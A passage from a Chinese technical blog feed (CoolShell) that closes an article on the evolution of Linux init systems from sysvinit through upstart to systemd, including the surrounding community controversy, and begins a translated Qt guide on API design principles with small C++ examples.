<p>比如，打印机需要CUPS等服务进程，但是如果用户没有打机印，启动这个服务完全是一种浪费，而如果不启动，如果要用打印机了，就无法使用，因为<code>sysvint</code> 没有自动检测的机制，它只能一次性启动所有的服务。另外，还有网络盘挂载的问题。在 <code>/etc/fstab</code> 中，负责硬盘挂载，有时候还有网络硬盘（NFS 或 iSCSI）在其中，但是在桌面机上，有很可能开机的时候是没有网络的， 于是网络硬盘都不可以访问，也无法挂载，这会极大的影响启动速度。<code>sysvinit</code> 采用 <code>netdev</code> 的方式来解决这个问题，也就是说，需要用户自己在 <code>/etc/fstab</code> 中给相应的硬盘配置上 <code>netdev</code> 属性，于是 <code>sysvint</code> 启动时不会挂载它，只有在网络可用后，由专门的 <code>netfs</code> 服务进程来挂载。这种管理方式比较难以管理，也很容易让人掉坑。</p>
<p>所以，Ubuntu 开发人员在评估了当时几个可选的 init 系统后，决定重新设计这个系统，于是，这就是我们后面看到的 <code>upstart</code> 。 <code>upstart</code> 基于事件驱动的机制，把之前的完全串行的同步启动服务的方式改成了由事件驱动的异步的方式。比如：如果有U盘插入，<code>udev</code> 得到通知，<code>upstart</code> 感知到这个事件后触发相应的服务程序，比如挂载文件系统等等。因为使用一个事件驱动的玩法，所以，启动操作系统时，很多不必要的服务可以不用启动，而是等待通知，lazy 启动。而且事件驱动的好处是，可以并行启动服务，他们之间的依赖关系，由相应的事件通知完成。</p>
<p>upstart 有着很不错的设计，其中最重要的两个概念是 Job 和 Event。</p>
<p><strong>Job</strong> 有一般的Job，也有service的Job，并且，<code>upstart</code> 管理了整个 Job 的生命周期，比如：Waiting, Starting, pre-Start, Spawned, post-Start, Running, pre-Stop, Stopping, Killed, post-Stop等等，并维护着这个生命周期的状态机。</p>
<p><strong>Event</strong> 分成三类，<code>signal</code>, <code>method</code> 和 <code>hooks</code>。<code>signal</code> 就是异步消息，<code>method</code> 是同步阻塞的。<code>hooks</code> 也是同步的，但介于前面两者之间，发出hook事件的进程必须等到事件完成，但不检查是否成功。</p>
<p>但是，<code>upstart</code> 的事件非常复杂，也非常纷乱，各种各样的事件（事件没有归好类）导致有点凌乱。不过因为整个事件驱动的设计比之前的 <code>sysvinit</code> 来说好太多，所以，也深得欢迎。</p>
<h4>
<span class="ez-toc-section" id="Systemd"></span>Systemd<span class="ez-toc-section-end"></span>
</h4>
<p>直到2010的有一天，一个在 RedHat工作的工程师 <a title="Lennart Poettering" href="https://en.wikipedia.org/wiki/Lennart_Poettering" target="_blank" rel="noopener noreferrer">Lennart Poettering</a> 和 <a title="Kay Sievers" href="https://en.wikipedia.org/wiki/Kay_Sievers">Kay Sievers</a> ，开始引入了一个新的 <code>init</code> 系统—— <code>systemd</code>。这是一个非常非常有野心的项目，这个项目几乎改变了所有的东西，<code>systemd</code> 不但想取代已有的 init 系统，而且还想干更多的东西。</p>
<p>Lennart 同意 <code>upstart</code> 干的不错，代码质量很好，基于事件的设计也很好。但是他觉得 <code>upstart</code> 也有问题，其中最大的问题还是不够快，虽然 <code>upstart</code> 用事件可以达到一定的启动并行度，但是，本质上来说，这些事件还是会让启动过程串行在一起。  如：<code>NetworkManager</code> 在等 <code>D-Bus</code> 的启动事件，而 <code>D-Bus</code> 在等 <code>syslog</code> 的启动事件。</p>
<p>Lennart 认为，实现上来说，<code>upstart</code> 其实是在管理一个逻辑上的服务依赖树，但是这个服务依赖树在表现形式上比较简单，你只需要配置——“启动 B好了就启动A”或是“停止了A后就停止B”这样的规则。但是，Lennart 说，这种简单其实是有害的（this simplification is actually detrimental）。他认为，</p>
<ul>
<li>从一个系统管理的角度出来，他一开始会设定好整个系统启动的服务依赖树，但是这个系统管理员要人肉的把这个本来就非常干净的服务依整树给翻译成计算机看的懂的 Event/Action 形式，而且 Event/Action 这种配置方式是运行时的，所以，你需要运行起来才知道是什么样的。</li>
</ul>
<ul>
<li>Event逻辑从头到脚到处都是，这个事件扩大了运维的复杂度，还不如之前的 <code>sysvint</code>。 也就是说，当用户配置了 “启动 <code>D-Bus</code> 后请启动 <code>NetworkManager</code>”， 这个 <code>upstart</code> 可以干，但是反过来，如果，用户启动 <code>NetworkManager</code>，我们应该先去启动他的前置依赖 <code>D-Bus</code>，然而你还要配置相应的反向 Event。本来，我只需要配置一条依赖的，结果现在我要配置很多很多情况下的Event。</li>
</ul>
<ul>
<li>最后，<code>upstart</code> 里的 Event 的并不标准，很混乱，没有良好的定义。比如：既有，进程启动，运行，停止的事件，也有USB设备插入、可用、拔出的事件，还有文件系统设备being mounted、 mounted 和 umounted 的事件，还有AC电源线连接和断开的事件。你会发现，这进程启停的、USB的、文件系统的、电源线的事件，看上去长得很像， 但是没有被标准化抽像出来掉，因为绝大多数的事件都是三元组：start, condition, stop 。这种概念设计模型并没有在 <code>upstart</code> 中出现。因为 <code>upstart</code> 被设计为单一的事件，而忽略了逻辑依赖。</li>
</ul>
<p>当然，如果 <code>systemd</code> 只是解决 <code>upstart</code> 的问题，他就改造 <code>upstart</code> 就好了，但是 Lennart 的野心不只是想干个这样的事，他想干的更多。</p>
<p>首先，<code>systemd</code> 清醒的认识到了 init 进程的首要目标是要让用户快速的进入可以操作OS的环境，所以，这个速度一定要快，越快越好，所以，<code>systemd</code> 的设计理念就是两条：</p>
<ul>
<li>To start <b>less</b>.</li>
<li>And to start <b>more</b> in <i>parallel</i>.</li>
</ul>
<p>也就是说，按需启动，能不启动就不启动，如果要启动，能并行启动就并行启动，包括你们之间有依赖，我也并行启动。按需启动还好理解，那么，有依赖关系的并行启动，它是怎么做到的？这里，<code>systemd</code> 借鉴了 MacOS 的 <code>Launchd</code> 的玩法（在Youtube上有一个分享——<a href="https://www.youtube.com/watch?v=SjrtySM9Dns" target="_blank" rel="noopener noreferrer">Launchd: One Program to Rule them All</a>，在苹果的开源网站上也有相关的设计文档——<a href="https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html" target="_blank" rel="noopener noreferrer">About Daemons and Services</a>）</p>
<p>要解决这些依赖性，systemd 需要解决好三种底层依赖—— Socket， D-Bus ，文件系统。</p>
<ul>
<li>
<strong>Socket依赖</strong>。如果服务C依赖于服务S的socket，那么就要先启动S，然后再启动C，因为如果C启动时找不到S的Socket，那么C就会失败。<code>systemd</code> 可以帮你在S还没有启动好的时候，建立一个socket，用来接收所有的C的请求和数据，并缓存之，一旦S全部启动完成，把systemd替换好的这个缓存的数据和Socket描述符替换过去。</li>
</ul>
<p> </p>
<ul>
<li>
<strong>D-Bus依赖</strong>。<code>D-Bus</code> 全称 Desktop Bus，是一个用来在进程间通信的服务。除了用于用户态进程和内核态进程通信，也用于用户态的进程之前。现在，很多的现在的服务进程都用 <code>D-Bus</code> 而不是Socket来通信。比如：<code>NetworkManager</code> 就是通过 <code>D-Bus</code> 和其它服务进程通讯的，也就是说，如果一个进程需要知道网络的状态，那么就必需要通过 <code>D-Bus</code> 通信。<code>D-Bus</code> 支持 “Bus Activation”的特性。也就是说，A要通过 <code>D-Bus</code> 服务和B通讯，但是B没有启动，那么 <code>D-Bus</code> 可以把B起来，在B启动的过程中，<code>D-Bus</code> 帮你缓存数据。<code>systemd</code> 可以帮你利用好这个特性来并行启动 A 和 B。</li>
</ul>
<p> </p>
<ul>
<li>
<strong>文件系统依赖</strong>。系统启动过程中，文件系统相关的活动是最耗时的，比如挂载文件系统，对文件系统进行磁盘检查（fsck），磁盘配额检查等都是非常耗时的操作。在等待这些工作完成的同时，系统处于空闲状态。那些想使用文件系统的服务似乎必须等待文件系统初始化完成才可以启动。<code>systemd</code> 参考了 <code>autofs</code> 的设计思路，使得依赖文件系统的服务和文件系统本身初始化两者可以并发工作。<code>autofs</code> 可以监测到某个文件系统挂载点真正被访问到的时候才触发挂载操作，这是通过内核 <code>automounter</code> 模块的支持而实现的。比如一个 <code>open()</code> 系统调用作用在某个文件系统上的时候，而这个文件系统尚未执行挂载，此时 <code>open()</code> 调用被内核挂起等待，等到挂载完成后，控制权返回给 <code>open()</code> 系统调用，并正常打开文件。这个过程和 <code>autofs</code> 是相似的。</li>
</ul>
<p> </p>
<p>下图来自 Lennart 的演讲里的一页PPT，展示了不同 init 系统的启动。</p>
<p><img alt="image placeholder" ></p>
<p>除此之外，systemd 还在启动时管理好了一些下面的事。</p>
<p>用C语言取代传统的脚本式的启动。前面说过，<code>sysvint</code> 用 <code>/etc/rcX.d</code> 下的各种脚本启动。然而这些脚本中需要使用 <code>awk</code>, <code>sed</code>, <code>grep</code>, <code>find</code>, <code>xargs</code> 等等这些操作系统的命令，这些命令需要生成进程，生成进程的开销很大，关键是生成完这些进程后，这个进程就干了点屁大的事就退了。换句话说就是，我操作系统干了那么多事为你拉个进程起来，结果你就把个字串转成小写就退了，把我操作系统当什么了？</p>
<p>在正常的一个 <code>sysvinit</code> 的脚本里，可能会有成百上千个这样的命令。所以，慢死。因此，<code>systemd</code> 全面用 C 语言全部取代了。一般来说，<code>sysvinit</code> 下，操作系统启动完成后，用 <code>echo $$</code> 可以看到，pid 被分配到了上千的样子，而 <code>systemd</code> 的系统只是上百。</p>
<p>另外，systemd 是真正一个可以管住服务进程的——可以跟踪上服务进程所fork/exec出来的所有进程。</p>
<ul>
<li>我们知道， 传统 Unix/Linux 的 Daemon 服务进程的最佳实践基本上是这个样子的 （具体过程可参看这篇文章“<a href="http://0pointer.de/public/systemd-man/daemon.html#SysV%20Daemons" target="_blank" rel="noopener noreferrer">SysV Daemon</a>”）——
<ol>
<li>进程启动时，关闭所有的打开的文件描述符（除了标准描述符0,1,2），然后重置所有的信号处理。</li>
<li>调用 <code>fork()</code> 创建子进程，在子进程中 <code>setsid()</code>，然后父进程退出（为了后台执行）</li>
<li>在子进程中，再调用一次 <code>fork()</code>，创建孙子进程，确定没有交互终端。然后子进程退出。</li>
<li>在孙子进程中，把标准输入标准输出标准错误都连到 <code>/dev/null</code> 上，还要创建 pid 文件，日志文件，处理相关信号 ……</li>
<li>最后才是真正开始提供服务。</li>
</ol>
</li>
</ul>
<p> </p>
<ul>
<li>在上面的这个过程中，服务进程除了两次 <code>fork</code> 外还会 <code>fork</code> 出很多很多的子进程（比如说一些Web服务进程，会根据用户的请求链接来 <code>fork</code> 子进程），这个进程树是相当难以管理的，因为，一旦父进程退出来了，子进程就会被挂到 PID 1下，所以，基本上来说，你无法通过服务进程自已给定的一个pid文件来找到所有的相关进程（这个对开发者的要求太高了），所以，在传统的方式下用脚本启停服务是相当相当的 Buggy 的，因为无法做对所有的服务生出来的子子孙孙做到监控。</li>
</ul>
<p> </p>
<ul>
<li>为了解决这个问题，<code>upstart</code> 通过变态的 <code>strace</code> 来跟踪进程中的 <code>fork()</code> 和 <code>exec()</code> 或 <code>exit()</code> 等相关的系统调用。这种方法相当笨拙。 <code>systemd</code> 使用了一个非常有意思的玩法来 tracking 服务进程生出来的所有进程，那就是用 <code>cgroup</code> （我在 <a href="https://coolshell.cn/articles/17049.html" target="_blank" rel="noopener noreferrer">Docker 的基础技术“cgroup篇”</a>中讲过这个东西）。cgroup主要是用来管理进程组资源配额的事，所以，无论服务如何启动新的子进程，所有的这些相关进程都会同属于一个 <code>cgroup</code>，所以，<code>systemd</code> 只需要简单的去遍历一下相应的 <code>cgroup</code> 的那个虚文件系统目录下的文件，就可以正确的找到所有的相关进程，并将他们一一停止。</li>
</ul>
<p> </p>
<p>另外，<code>systemd</code> 简化了整个 daemon 开发的过程：</p>
<ul>
<li>不需要两次 <code>fork()</code>，只需要实现服务本身的主逻辑就可以了。</li>
<li>不需要 <code>setsid()</code>，<code>systemd</code> 会帮你干</li>
<li>不需要维护 <code>pid文件</code>，<code>systemd</code> 会帮处理。</li>
<li>不需要管理日志文件或是使用<code>syslog</code>，或是处理<code>HUP</code>的日志reload信号。把日志打到 <code>stderr</code> 上，<code>systemd</code> 帮你管理。</li>
<li>处理 <code>SIGTERM</code> 信号，这个信号就是正确退出当前服务，不要做其他的事。</li>
<li>……</li>
</ul>
<p>除此之外，<code>systemd</code> 还能——</p>
<ul>
<li>自动检测启动的服务间有没有环形依赖。</li>
<li>内建 autofs 自动挂载管理功能。</li>
<li>日志服务。<code>systemd</code> 改造了传统的 syslog 的问题，采用二进制格式保存日志，日志索引更快。</li>
<li>快照和恢复。对当前的系统运行的服务集合做快照，并可以恢复。</li>
<li>……</li>
</ul>
<p>还有好多好多，他接管很多很多东西，于是就让很多人不爽了，因为他在干了很多本不属于 PID 1 的事。</p>
<h4>
<span class="ez-toc-section" id="Systemd_%E4%BA%89%E8%AE%BA%E5%92%8C%E5%85%AB%E5%8D%A6"></span>Systemd 争论和八卦<span class="ez-toc-section-end"></span>
</h4>
<p>于是 <code>systemd</code> 这个东西成了可能是有史以来口水战最多的一个开源软件了。<code>systemd</code> 饱受各种争议，最大的争议就是他破坏了 Unix 的设计哲学（相关的哲学可以读一下《<a href="https://book.douban.com/subject/1467587/" target="_blank" rel="noopener noreferrer">Unix编程艺术</a>》），干了一个大而全而且相当复杂的东西。当然，Lennart 并不同意这样的说法，他后来又写一篇blog “<a href="http://0pointer.de/blog/projects/the-biggest-myths.html" target="_blank" rel="noopener noreferrer">The Biggest Myths</a>”来解释 <code>systemd</code> 并不是这样的，大家可以前往一读。</p>
<p>这个争议大到什么样子呢？2014 年，Debian Linux 因为想准备使用 <code>systemd</code> 来作为标准的 init 守护进程来替换 <code>sysvinit</code> 。而围绕这个事的争论达到了空前的热度，争论中充满着仇恨，<code>systemd</code> 的支持者和反对者都在互相辱骂，导致当时 Debian 阵营开始分裂。还有人给 Lennart 发了死亡威胁的邮件，用比特币雇凶买杀手，扬言要取他的性命，在Youbute上传了侮辱他的歌曲，在IRC和各种社交渠道上给他发下流和侮辱性的消息。这已经不是争议了，而是一种不折不扣的仇恨！</p>
<p><img alt="image placeholder" ></p>
<p>于是，Lennart 在 <a href="https://plus.google.com/+LennartPoetteringTheOneAndOnly/posts/J2TZrTvu7vd" target="_blank" rel="noopener noreferrer">Google Plus 上发了贴子</a>，批评整个 Linux 开源社区和 Linus 本人。他大意说，</p>
<blockquote><p>这个社区太病态了，全是 ass holes，你们不停用各种手段在各种地方用不同的语言和方式来侮辱和漫骂我。我还是一个年轻人，我从来没有经历过这样的场面，但是今天我已经对这种场面很熟悉了。我有时候说话可能不准确，但是我不会像他样那样说出那样的话，我也没有被这些事影响，因为我脸皮够厚，所以，为什么我可以在如何大的反对声面前让 <code>systemd</code> 成功，但是，你们 Linux 社区太可怕了。你们里面的有精神病的人太多了。另外，对于Linus Torvalds，你是这个社区的 Role Model，但可惜你是一个 Bad Role Model，你在社区里的刻薄和侮辱性的言行，基本从一定程度上鼓励了其它人跟你一样，当然，并不只是你一个人的问题，而是在你周围聚集了一群和你一样的这样干的人。送你一句话—— A fish rots from the head down ！一条鱼是从头往下腐烂的……</p></blockquote>
<p>这篇契文很长，喜欢八卦的同学可以前往一读。感受一下 Lennart 当时的心态（我觉得能算上是非常平稳了）。</p>
<p>Linus也在被一媒体问起 <code>systemd</code> 这个事来（参看“<a href="https://www.itwire.com/business-it-news/open-source/65402-torvalds-says-he-has-no-strong-opinions-on-systemd" target="_blank" rel="noopener noreferrer">Torvalds says he has no strong opinions on systemd</a>”），Linus在采访里说，</p>
<blockquote><p>我对 <code>systemd</code> 和 Lennart 的贴子没有什么强烈的想法。虽然，传统的 Unix 设计哲学—— “Do one thing and Do it well”，很不错，而且我们大多数人也实践了这么多年，但是这并不代表所有的真实世界。在历史上，也不只有<code>systemd</code> 这么干过。但是，我个人还是 old-fashioned 的人，至少我喜欢文本式的日志，而不是二进制的日志。但是 <code>systemd</code> 没有必要一定要有这样的品味。哦，我说细节了……</p></blockquote>
<p>今天，<code>systemd</code> 占据了几乎所有的主流的 Linux 发行版的默认配置，包括：Arch Linux、CentOS、CoreOS、Debian、Fedora、Megeia、OpenSUSE、RHEL、SUSE企业版和 Ubuntu。而且，对于 CentOS, CoreOS, Fedora, RHEL, SUSE这些发行版来说，不能没有 <code>systemd</code>。（Ubuntu 还有一个不错的wiki – <a href="https://wiki.ubuntu.com/SystemdForUpstartUsers" target="_blank" rel="noopener noreferrer">Systemd for Upstart Users</a> 阐述了如何在两者间切换）</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83"></span>其它<span class="ez-toc-section-end"></span>
</h4>
<p>还记得在《<a href="https://coolshell.cn/articles/17416.html" target="_blank" rel="noopener noreferrer">缓存更新的套路</a>》一文中，我说过，<strong>如果你要做好架构，首先你得把计算机体系结构以及很多老古董的基础技术吃透了</strong>。因为里面会有很多可以借鉴和相通的东西。那么，你是否从这篇文章里看到了一些有分布式架构相似的东西？</p>
<p>比如：从 <code>sysvinit</code> 到 <code>upstart</code> 再到 <code>systemd</code>，像不像是服务治理？Linux系统下的这些服务进程，是不是很像分布式架构中的微服务？还有那个D-Bus，是不是很像SOA里的ESB？而 init 系统是不是很像一个控制系统？甚至像一个服务编排（Service Orchestration）系统？</p>
<p>分布式系统中的服务之间也有很多依赖，所以，在启动一个架构的时候，如果我们可以做到像 systemd 那样并行启动的话，那么是不是就像是一个微服务的玩法了？</p>
<p>嗯，你会发现，技术上的很多东西是相通的，也是互相有对方的影子，所以，其实技术并不多。关键是我们学在了表面还是看到了本质。</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E5%BB%B6%E4%BC%B8%E9%98%85%E8%AF%BB"></span>延伸阅读<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>Lennert 的博文：<a href="http://0pointer.de/blog/projects/systemd.html" target="_blank" rel="noopener noreferrer">Rethinking PID 1</a>
</li>
<li>Lennert 的演讲：<a href="https://www.youtube.com/watch?v=TyMLi8QF6sw" target="_blank" rel="noopener noreferrer">systemd, beyond init</a> （ <a href="http://www.linux-kongress.org/2010/slides/systemd-poettering.pdf" target="_blank" rel="noopener noreferrer">PPT</a> ）</li>
<li><a href="https://en.wikipedia.org/wiki/Systemd" target="_blank" rel="noopener noreferrer">Wikipedia：Systemd</a></li>
<li>LinuxVoice：<a href="https://www.linuxvoice.com/interview-lennart-poettering/" target="_blank" rel="noopener noreferrer">Lennart Poettering 专访</a>
</li>
</ul>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2017-07-16T21:40:55+08:00</pubDate>
<guid>https://coolshell.cn/articles/17998.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ API设计原则 – Qt官网的设计实践总结 ]]></title>
<link>https://coolshell.cn/articles/18024.html</link>
<content><![CDATA[ 
<p><span style="color: #993300;"><strong>（感谢好友 <a href="https://weibo.com/oldratlee" target="_blank" rel="noopener noreferrer">@李鼎</a> 翻译此文）</strong></span></p>
<p>原文链接：<a href="http://qt-project.org/wiki/API-Design-Principles">API Design Principles</a> – <a href="https://wiki.qt.io/">Qt Wiki</a><br>
基于<a href="http://blog.csdn.net/gaoyingju">Gary的影响力</a>上 <em>Gary Gao</em> 的译文稿：<a href="http://blog.csdn.net/gaoyingju/article/details/8245108">C++的API设计指导</a></p>
<h2>译序</h2>
<p><img alt="image placeholder" ></p>
<p>Qt的设计水准在业界很有口碑，一致、易于掌握和强大的API是Qt最著名的优点之一。此文既是Qt官网上的API设计指导准则，也是Qt在API设计上的实践总结。虽然Qt用的是C++，但其中设计原则和思考是具有普适性的（如果你对C++还不精通，可以忽略与C++强相关或是过于细节的部分，仍然可以学习或梳理关于API设计最有价值的内容）。整个篇幅中有很多示例，是关于API设计一篇难得的好文章。</p>
<p>需要注意的是，这篇Wiki有一些内容并不完整，所以，可能会有一些阅读上的问题，我们对此做了一些相关的注释。</p>
<p>PS：翻译中肯定会有不足和不对之处，欢迎评论&amp;交流；另译文源码在<a href="https://github.com/oldratlee/translations/tree/master/api-design-principles-from-qt">GitHub的这个仓库</a>中，可以<a href="https://github.com/oldratlee/translations/issues">提交Issue</a>/<a href="https://github.com/oldratlee/translations/fork">Fork后提交代码</a>来建议/指正。</p>
<h1>API设计原则</h1>
<p>一致、易于掌握和强大的API是Qt最著名的优点之一。此文总结了我们在设计Qt风格API的过程中所积累的诀窍（know-how）。其中许多是通用准则；而其他的则更偏向于约定，遵循这些约定主要是为了与已有的API保持一致。</p>
<p>虽然这些准则主要用于对外的API（public API），但在设计对内的API（private API）时也推荐遵循相同的技巧（techniques），作为开发者之间协作的礼仪（courtesy）。</p>
<p><span id="more-18024"></span></p>
<p>如有兴趣也可以读一下 <em>Jasmin Blanchette</em> 的<a href="http://www4.in.tum.de/~blanchet/api-design.pdf">Little Manual of API Design (PDF)</a> 或是本文的前身 <em>Matthias Ettrich</em> 的<a href="https://doc.qt.io/archives/qq/qq13-apis.html">Designing Qt-Style C++ APIs</a>。</p>
<h1>1. 好API的6个特质</h1>
<p>API之于程序员就如同图形界面之于普通用户（end-user）。API中的『P』实际上指的是『程序员』（Programmer），而不是『程序』（Program），强调的是API是给程序员使用的这一事实。</p>
<p>在第13期<a href="https://doc.qt.io/archives/qq/">Qt季刊</a>，<em>Matthias</em> 的<a href="https://doc.qt.io/archives/qq/qq13-apis.html">关于API设计的文章</a>中提出了观点：API应该极简（minimal）且完备（complete）、语义清晰简单（have clear and simple semantics）、符合直觉（be intuitive）、易于记忆（be easy to memorize）和引导API使用者写出可读代码（lead to readable code）。</p>
<h2>1.1 极简</h2>
<p>极简的API是指每个class的public成员尽可能少，public的class也尽可能少。这样的API更易理解、记忆、调试和变更。</p>
<h2>1.2 完备</h2>
<p>完备的API是指期望有的功能都包含了。这点会和保持API极简有些冲突。如果一个成员函数放在错误的类中，那么这个函数的潜在用户就会找不到，这也是违反完备性的。</p>
<h2>1.3 语义清晰简单</h2>
<p>就像其他的设计一样，我们应该遵守最少意外原则（the principle of least surprise）。好的API应该可以让常见的事完成的更简单，并有可以完成不常见的事的可能性，但是却不会关注于那些不常见的事。解决的是具体问题；当没有需求时不要过度通用化解决方案。（举个例子，在Qt 3中，<code>QMimeSourceFactory</code>不应命名成<code>QImageLoader</code>并有不一样的API。）</p>
<h2>1.4 符合直觉</h2>
<p>就像计算机里的其他事物一样，API应该符合直觉。对于什么是符合直觉的什么不符合，不同经验和背景的人会有不同的看法。API符合直觉的测试方法：经验不很丰富的用户不用阅读API文档就能搞懂API，而且程序员不用了解API就能看明白使用API的代码。</p>
<h2>1.5 易于记忆</h2>
<p>为使API易于记忆，API的命名约定应该具有一致性和精确性。使用易于识别的模式和概念，并且避免用缩写。</p>
<h2>1.6 引导API使用者写出可读代码</h2>
<p>代码只写一次，却要多次的阅读（还有调试和修改）。写出可读性好的代码有时候要花费更多的时间，但对于产品的整个生命周期来说是节省了时间的。</p>
<p>最后，要记住的是，不同的用户会使用API的不同部分。尽管简单使用单个Qt类的实例应该符合直觉，但如果是要继承一个类，让用户事先看好文档是个合理的要求。</p>
<h1>2. 静态多态</h1>
<p>相似的类应该有相似的API。在继承（inheritance）合适时可以用继承达到这个效果，即运行时多态。然而多态也发生在设计阶段。例如，如果你用<code>QProgressBar</code>替换<code>QSlider</code>，或是用<code>QString</code>替换<code>QByteArray</code>，你会发现API的相似性使的替换很容易。这即是所谓的『静态多态』（static polymorphism）。</p>
<p>静态多态也使记忆API和编程模式更加容易。因此，一组相关的类有相似的API有时候比每个类都有各自的一套API更好。</p>
<p>一般来说，在Qt中，如果没有足够的理由要使用继承，我们更倾向于用静态多态。这样可以减少Qt public类的个数，也使刚学习Qt的用户在翻看文档时更有方向感。</p>
<h2>2.1 好的案例</h2>
<p><code>QDialogButtonBox</code>与<code>QMessageBox</code>，在处理按钮（<code>addButton()</code>、<code>setStandardButtons()</code>等等）上有相似的API，不需要继承某个<code>QAbstractButtonBox</code>类。</p>
<h2>2.2 差的案例</h2>
<p><code>QTcpSocket</code>与<code>QUdpSocket</code>都继承了<code>QAbstractSocket</code>，这两个类的交互行为的模式（mode of interaction）非常不同。似乎没有什么人以通用和有意义的方式用过<code>QAbstractSocket</code>指针（或者 <strong><em>能</em></strong> 以通用和有意义的方式使用<code>QAbstractSocket</code>指针）。</p>
<h2>2.3 值得斟酌的案例</h2>
<p><code>QBoxLayout</code>是<code>QHBoxLayout</code>与<code>QVBoxLayout</code>的父类。好处：可以在工具栏上使用<code>QBoxLayout</code>，调用<code>setOrientation()</code>使其变为水平/垂直。坏处：要多一个类，并且有可能导致用户写出这样没什么意义的代码，<code>((QBoxLayout *)hbox)-&gt;setOrientation(Qt::Vertical)</code>。</p>
<h1>3. 基于属性的API</h1>
<p>新的Qt类倾向于用『基于属性（property）的API』，例如：</p>
<p>[code language=”cpp”]<br>
QTimer timer;<br>
timer.setInterval(1000);<br>
timer.setSingleShot(true);<br>
timer.start();<br>
[/code]</p>
<p>这里的 <strong><em>属性</em></strong> 是指任何的概念特征（conceptual attribute），是对象状态的一部分 —— 无论它是不是<code>Q_PROPERTY</code>。在说得通的情况下，用户应该可以以任何顺序设置属性，也就是说，属性之间应该是正交的（orthogonal）。例如，上面的代码可以写成：</p>
<p>[code language=”cpp”]<br>
QTimer timer;<br>
timer.setSingleShot(true);<br>
timer.setInterval(1000);<br>
timer.start();<br>
[/code]</p>
<blockquote><p>【译注】：正交性是指改变某个特性而不会影响到其他的特性。<a href="https://book.douban.com/subject/5387402/">《程序员修炼之道》</a>中讲了关于正交性的一个直升飞机坠毁的例子，讲得深入浅出很有画面感。</p></blockquote>
<p>为了方便，也写成：</p>
<p>[code language=”cpp”]<br>
timer.start(1000)；<br>
[/code]</p>
<p>类似地，对于<code>QRegExp</code>会是这样的代码：</p>
<p>[code language=”cpp”]<br>
QRegExp regExp;<br>
regExp.setCaseSensitive(Qt::CaseInsensitive);<br>
regExp.setPattern(".");<br>
regExp.setPatternSyntax(Qt::WildcardSyntax);<br>
[/code]</p>
<p>为实现这种类型的API，需要借助底层对象的懒创建。例如，对于<code>QRegExp</code>的例子，在不知道模式语法（pattern syntax）的情况下，在<code>setPattern()</code>中去解释<code>"."</code>就为时过早了。</p>
<p>属性之间常常有关联的；在这种情况下，我们必须小心处理。思考下面的问题：当前的风格（style）提供了『默认的图标尺寸』属性 vs. <code>QToolButton</code>的『<code>iconSize</code>』属性：</p>
<p>[code language=”cpp”]<br>
toolButton-&gt;setStyle(otherStyle);<br>
toolButton-&gt;iconSize(); // returns the default for otherStyle<br>
toolButton-&gt;setIconSize(QSize(52, 52));<br>
toolButton-&gt;iconSize(); // returns (52, 52)<br>
toolButton-&gt;setStyle(yetAnotherStyle);<br>
toolButton-&gt;iconSize(); // returns (52, 52)<br>
[/code]</p>
<p>提醒一下，一旦设置了<code>iconSize</code>，设置就会一直保持，即使改变当前的风格。这 <strong><em>很好</em></strong>。但有的时候需要能重置属性。有两种方法：</p>
<ol>
<li>传入一个特殊值（如<code>QSize()</code>、<code>-1</code>或者<code>Qt::Alignment(0)</code>）来表示『重置』</li>
<li>提供一个明确的重置方法，如<code>resetFoo()</code>和<code>unsetFoo()</code>
</li>
</ol>
<p>对于<code>iconSize</code>，使用<code>QSize()</code>（比如 <code>QSize(–1, -1)</code>）来表示『重置』就够用了。</p>
<p>在某些情况下，getter方法返回的结果与所设置的值不同。例如，虽然调用了<code>widget-&gt;setEnabled(true)</code>，但如果它的父widget处于disabled状态，那么<code>widget-&gt;isEnabled()</code>仍然返回的是<code>false</code>。这样是OK的，因为一般来说就是我们想要的检查结果（父widget处于disabled状态，里面的子widget也应该变为灰的不响应用户操作，就好像子widget自身处于disabled状态一样；与此同时，因为子widget记得在自己的内心深处是enabled状态的，只是一直等待着它的父widget变为enabled）。当然诸如这些都必须在文档中妥善地说明清楚。</p>
<h1>4. C++相关</h1>
<h2>4.1 值 vs. 对象</h2>
<h3>4.1.1 指针 vs. 引用</h3>
<p>指针（pointer）还是引用（reference）哪个是最好的输出参数（out-parameters）？</p>
<p>[code language=”cpp”]<br>
void getHsv(int *h, int *s, int *v) const;<br>
void getHsv(int &amp;h, int &amp;s, int &amp;v) const;<br>
[/code]</p>
<p>大多数C++书籍推荐尽可能使用引用，基于一个普遍的观点：引用比指针『更加安全和优雅』。与此相反，我们在开发Qt时倾向于指针，因为指针让用户代码可读性更好。比较下面例子：</p>
<p>[code language=”cpp”]<br>
color.getHsv(&amp;h, &amp;s, &amp;v);<br>
color.getHsv(h, s, v);<br>
[/code]</p>
<p>只有第一行代码清楚表达出<code>h</code>、<code>s</code>、<code>v</code>参数在函数调用中非常有可能会被修改。</p>
<p>这也就是说，编译器并不喜欢『出参』，所你应该在新的API中避免使用『出参』，而是返回一个结构体，如下所示：</p>
<p>[code language=”cpp”]<br>
struct Hsv { int hue, saturation, value };<br>
Hsv getHsv() const;<br>
[/code]</p>
<blockquote>
<p>【译注】：函数的『入参』和『出参』的混用会导致 API 接口语义的混乱，所以，使用指针，在调用的时候，实参需要加上“&amp;”，这样在代码阅读的时候，可以看到是一个『出参』，有利于代码阅读。（但是这样做，在函数内就需要判断指针是否为空的情况，因为引用是不需要判断的，所以，这是一种 trade-off）</p>
<p>另外，如果这样的参数过多的话，最好使用一个结构体来把数据打包，一方面，为一组返回值取个名字，另一方面，这样有利用接口的简单。</p>
</blockquote>
<h3>4.1.2 按常量引用传参 vs. 按值传参</h3>
<p>如果类型大于16字节，按常量引用传参。</p>
<p>如果类型有重型的（non-trivial）拷贝构造函数（copy-constructor）或是重型的析构函数（destructor），按常量引用传参以避免执行这些函数。</p>
<p>对于其它的类型通常应该按值传参。</p>
<p>示例：</p>
<p>[code language=”cpp”]<br>
void setAge(int age);<br>
void setCategory(QChar cat);<br>
void setName(QLatin1String name);</p>
